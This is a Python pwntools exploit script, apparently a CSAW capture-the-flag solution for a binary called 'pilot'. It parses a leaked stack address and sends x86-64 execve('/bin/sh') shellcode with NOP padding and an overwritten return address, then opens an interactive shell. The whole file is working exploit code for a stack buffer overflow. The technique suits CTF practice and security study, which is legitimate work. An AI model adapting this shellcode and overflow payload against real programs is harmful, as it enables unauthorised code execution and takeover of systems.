from pwn import *
from struct import *

sh = process("./pilot")
#sh = remote("pwn.chal.csaw.io", 8464)

sh.readline()
sh.readline()
sh.readline()
sh.readline()
sh.readline()
sh.readline()

addr = sh.readline()
addr = addr.split(':')[1]

ret = pack("<Q", int(addr, 16))

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

mov_rsp = "\x48\x83\xec\x30"

nops = "\x90" *(0x20 - len(shellcode) - len(mov_rsp))

padding = "B"*8 #old ebp

sh.send(mov_rsp + shellcode + nops + padding + ret)

sh.interactive()
